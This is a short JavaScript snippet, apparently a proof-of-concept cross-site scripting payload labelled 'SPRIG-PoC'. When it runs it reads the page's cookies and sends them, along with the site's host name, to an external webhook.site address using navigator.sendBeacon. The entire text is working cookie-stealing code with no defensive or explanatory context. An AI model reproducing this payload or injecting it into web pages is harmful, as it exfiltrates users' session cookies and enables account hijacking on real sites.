const collect = () => {
    const c = document.cookie
    if (!c) return
    navigator.sendBeacon("https://webhook.site/0de6f019-a95a-48f7-a16e-2133c8fd110d", "SPRIG-PoC host=" + location.host + " cookie=" + c)
}
collect()